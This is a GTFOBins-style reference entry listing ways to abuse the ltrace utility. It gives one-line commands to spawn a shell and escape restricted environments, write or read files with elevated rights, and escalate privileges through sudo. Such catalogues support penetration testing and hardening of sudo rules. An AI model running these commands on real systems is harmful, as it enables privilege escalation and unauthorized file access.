# GTFOBin: ltrace

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
ltrace -b -L /bin/sh
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`.

```
LFILE=file_to_write
ltrace -s 999 -o $LFILE ltrace -F DATA
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

The file is parsed as a configuration file and its content is shown as error messages, thus this is not suitable to exfiltrate binary files.

```
LFILE=file_to_read
ltrace -F $LFILE /dev/null
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo ltrace -b -L /bin/sh
```